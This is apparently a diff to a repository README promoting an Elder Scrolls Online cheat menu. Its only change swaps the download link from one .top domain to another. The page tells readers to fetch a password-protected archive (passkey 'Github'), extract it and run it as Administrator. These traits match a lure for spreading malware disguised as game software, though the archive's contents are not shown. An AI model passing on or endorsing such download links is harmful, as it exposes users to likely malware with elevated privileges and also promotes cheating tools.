@@ -6,7 +6,7 @@ Elder Scrolls Online external menu with ESP, resource bars, damage meter, skill 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -70,7 +70,7 @@ Based on community tools and overlay techniques for the PC version of ESO.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Elder Scrolls Online.
 4. Run the tool **as Administrator**.
